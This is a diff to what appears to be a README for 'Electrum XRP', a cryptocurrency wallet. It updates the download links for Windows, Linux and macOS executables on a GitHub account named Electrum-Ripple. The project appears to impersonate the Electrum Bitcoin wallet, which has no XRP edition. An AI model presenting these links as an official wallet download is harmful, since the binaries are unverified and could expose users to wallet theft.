@@ -12,13 +12,13 @@
 Choose your operating system to download the latest version:
 
 **Windows**  
-[Electrum XRP for Windows](https://github.com/Electrum-Ripple/electrum-xrp/releases/download/v.4.1.1/Electrum-4.1.1-xrp-win64.exe)
+[Electrum XRP for Windows](https://github.com/Electrum-Ripple/electrum-xrp/releases/download/v4.1.1/electrum-4.1.1-xrp-win64.exe)
 
 **Linux**  
-[Electrum XRP for Linux](https://github.com/Electrum-Ripple/electrum-xrp/releases/download/v.4.1.1/Electrum-4.1.1-xrp-linux-x64.AppImage)
+[Electrum XRP for Linux](https://github.com/Electrum-Ripple/electrum-xrp/releases/download/v4.1.1/electrum-4.1.1-xrp-linux.AppImage)
 
 **macOS**  
-[Electrum XRP for macOS](https://github.com/Electrum-Ripple/electrum-xrp/releases/download/v.4.1.1/Electrum-4.1.1-xrp-macos.dmg)
+[Electrum XRP for macOS](https://github.com/Electrum-Ripple/electrum-xrp/releases/download/v4.1.1/electrum-4.1.1-xrp-macos.dmg)
 
 ---
 
